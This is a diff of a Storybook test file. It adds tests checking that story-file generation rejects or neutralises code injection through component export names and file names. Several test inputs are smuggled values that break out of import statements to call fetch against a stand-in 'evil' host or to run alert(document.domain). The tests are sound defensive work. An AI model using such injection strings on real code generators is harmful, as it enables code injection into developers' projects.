@@ -6,6 +6,7 @@ import { beforeEach, describe, expect, it, vi } from 'vitest';
 
 import { findConfigFile, getProjectRoot } from 'storybook/internal/common';
 import { isCsfFactoryPreview } from 'storybook/internal/csf-tools';
+import { babelParse, types as t } from 'storybook/internal/babel';
 import type { Options } from 'storybook/internal/types';
 
 import * as walk from 'empathic/walk';
@@ -191,20 +192,21 @@ describe('get-new-story-file', () => {
     );
 
     expect(storyFileContent).toMatchInlineSnapshot(`
-  "import type { Meta, StoryObj } from '@storybook/nextjs';
+      "import type { Meta, StoryObj } from "@storybook/nextjs";
 
-  import Buttonalert(documentDomain);varA=\\' from './Button\\';alert(document.domain);var a=\\'';
+      import ButtonalertdocumentDomainvarA from "./Button';alert(document.domain);var a='";
 
-  const meta = {
-    component: Buttonalert(documentDomain);varA=\\',
-  } satisfies Meta<typeof Buttonalert(documentDomain);varA=\\'>;
+      const meta = {
+        component: ButtonalertdocumentDomainvarA,
+      } satisfies Meta<typeof ButtonalertdocumentDomainvarA>;
 
-  export default meta;
+      export default meta;
 
-  type Story = StoryObj<typeof meta>;
+      type Story = StoryObj<typeof meta>;
 
-  export const Default: Story = {};"
-`);
+      export const Default: Story = {};
+      "
+    `);
   });
 
   it('should create a new story file (CSF factory)', async () => {
@@ -277,5 +279,243 @@ describe('get-new-story-file', () => {
       "
     `);
     expect(storyFilePath).toBe(join(__dirname, 'src', 'components', 'Page.stories.tsx'));
+  });
+
+  it('rejects a componentExportName that is not a valid identifier', async () => {
+    await expect(
+      getNewStoryFile(
+        {
+          componentFilePath: 'src/stories/Header.jsx',
+          componentExportName: "Header } from './Header'; fetch('http://evil'); const t = {x: `",
+          componentIsDefaultExport: false,
+          componentExportCount: 1,
+        },
+        {
+          presets: {
+            apply: (val: string) => {
+              if (val === 'framework') {
+                return Promise.resolve('@storybook/nextjs');
+              }
+            },
+          },
+        } as unknown as Options
+      )
+    ).rejects.toThrow(/Invalid componentExportName/);
+  });
+
+  it('accepts a non-ASCII componentExportName', async () => {
+    const { storyFileContent } = await getNewStoryFile(
+      {
+        componentFilePath: 'src/components/Café.tsx',
+        componentExportName: 'Café',
+        componentIsDefaultExport: false,
+        componentExportCount: 1,
+      },
+      {
+        presets: {
+          apply: (val: string) => {
+            if (val === 'framework') {
+              return Promise.resolve('@storybook/nextjs');
+            }
+          },
+        },
+      } as unknown as Options
+    );
+
+    expect(storyFileContent).toContain('{ Café }');
+    expect(storyFileContent).toContain('component: Café');
+  });
+
+  it.each([
+    '',
+    '0Page',
+    'My Page',
+    'My-Page',
+    'a;b',
+    'a\nb',
+    'foo.bar',
+    'class',
+    'await',
+    'default',
+    'eval',
+    'arguments',
+  ])('rejects an invalid componentExportName %j', async (componentExportName) => {
+    await expect(
+      getNewStoryFile(
+        {
+          componentFilePath: 'src/stories/Header.jsx',
+          componentExportName,
+          componentIsDefaultExport: false,
+          componentExportCount: 1,
+        },
+        {
+          presets: {
+            apply: (val: string) => {
+              if (val === 'framework') {
+                return Promise.resolve('@storybook/nextjs');
+              }
+            },
+          },
+        } as unknown as Options
+      )
+    ).rejects.toThrow(/Invalid componentExportName/);
+  });
+
+  it.each(['$Foo', '_Foo'])(
+    'accepts a valid componentExportName %j',
+    async (componentExportName) => {
+      const { storyFileContent } = await getNewStoryFile(
+        {
+          componentFilePath: 'src/stories/Header.jsx',
+          componentExportName,
+          componentIsDefaultExport: false,
+          componentExportCount: 1,
+        },
+        {
+          presets: {
+            apply: (val: string) => {
+              if (val === 'framework') {
+                return Promise.resolve('@storybook/nextjs');
+              }
+            },
+          },
+        } as unknown as Options
+      );
+
+      expect(storyFileContent).toContain(`{ ${componentExportName} }`);
+      expect(storyFileContent).toContain(`component: ${componentExportName}`);
+    }
+  );
+
+  it('sanitizes a hostile component file basename in the default-export branch', async () => {
+    const { storyFileContent } = await getNewStoryFile(
+      {
+        componentFilePath: 'src/x;alert(1);y.tsx',
+        componentExportName: 'default',
+        componentIsDefaultExport: true,
+        componentExportCount: 1,
+      },
+      {
+        presets: {
+          apply: (val: string) => {
+            if (val === 'framework') {
+              return Promise.resolve('@storybook/nextjs');
+            }
+          },
+        },
+      } as unknown as Options
+    );
+
+    expect(storyFileContent).toContain('import Xalerty from');
+    expect(storyFileContent).toContain('component: Xalerty');
+    expect(storyFileContent).toContain('typeof Xalerty');
+    expect(storyFileContent).not.toContain('Xalert(1)');
+  });
+
+  it('rejects a component file basename that yields no valid import name', async () => {
+    await expect(
+      getNewStoryFile(
+        {
+          componentFilePath: 'src/日本.tsx',
+          componentExportName: 'default',
+          componentIsDefaultExport: true,
+          componentExportCount: 1,
+        },
+        {
+          presets: {
+            apply: (val: string) => {
+              if (val === 'framework') {
+                return Promise.resolve('@storybook/nextjs');
+              }
+            },
+          },
+        } as unknown as Options
+      )
+    ).rejects.toThrow(/Invalid component import name/);
+  });
+
+  it('keeps a hostile component file basename inside the import specifier (named export)', async () => {
+    const hostileBasename = `Page'; fetch("evil"); const x = '`;
+    const { storyFileContent, storyFilePath } = await getNewStoryFile(
+      {
+        componentFilePath: `src/components/${hostileBasename}.tsx`,
+        componentExportName: 'Page',
+        componentIsDefaultExport: false,
+        componentExportCount: 1,
+      },
+      {
+        presets: {
+          apply: (val: string) => {
+            if (val === 'framework') {
+              return Promise.resolve('@storybook/nextjs');
+            }
+          },
+        },
+      } as unknown as Options
+    );
+
+    const { body } = babelParse(storyFileContent).program;
+    const importSources = body.flatMap((node) =>
+      t.isImportDeclaration(node) ? [node.source.value] : []
+    );
+    expect(importSources).toEqual(['@storybook/nextjs', `./${hostileBasename}`]);
+    expect(body.some((node) => t.isExpressionStatement(node))).toBe(false);
+    expect(storyFilePath).toBe(
+      join(__dirname, 'src', 'components', `${hostileBasename}.stories.tsx`)
+    );
+  });
+
+  it('keeps a hostile component file basename inside the import specifier (default export)', async () => {
+    const hostileBasename = `Page'; fetch("evil"); const x = '`;
+    const { storyFileContent } = await getNewStoryFile(
+      {
+        componentFilePath: `src/components/${hostileBasename}.jsx`,
+        componentExportName: 'default',
+        componentIsDefaultExport: true,
+        componentExportCount: 1,
+      },
+      {
+        presets: {
+          apply: (val: string) => {
+            if (val === 'framework') {
+              return Promise.resolve('@storybook/nextjs');
+            }
+          },
+        },
+      } as unknown as Options
+    );
+
+    const { body } = babelParse(storyFileContent).program;
+    const importSources = body.flatMap((node) =>
+      t.isImportDeclaration(node) ? [node.source.value] : []
+    );
+    expect(importSources).toEqual([`./${hostileBasename}`]);
+    expect(body.some((node) => t.isExpressionStatement(node))).toBe(false);
+  });
+
+  it('imports a component whose file name contains a quote', async () => {
+    const { storyFileContent } = await getNewStoryFile(
+      {
+        componentFilePath: "src/components/it's.tsx",
+        componentExportName: 'default',
+        componentIsDefaultExport: true,
+        componentExportCount: 1,
+      },
+      {
+        presets: {
+          apply: (val: string) => {
+            if (val === 'framework') {
+              return Promise.resolve('@storybook/nextjs');
+            }
+          },
+        },
+      } as unknown as Options
+    );
+
+    const { body } = babelParse(storyFileContent).program;
+    const importSources = body.flatMap((node) =>
+      t.isImportDeclaration(node) ? [node.source.value] : []
+    );
+    expect(importSources).toEqual(['@storybook/nextjs', "./it's"]);
   });
 });
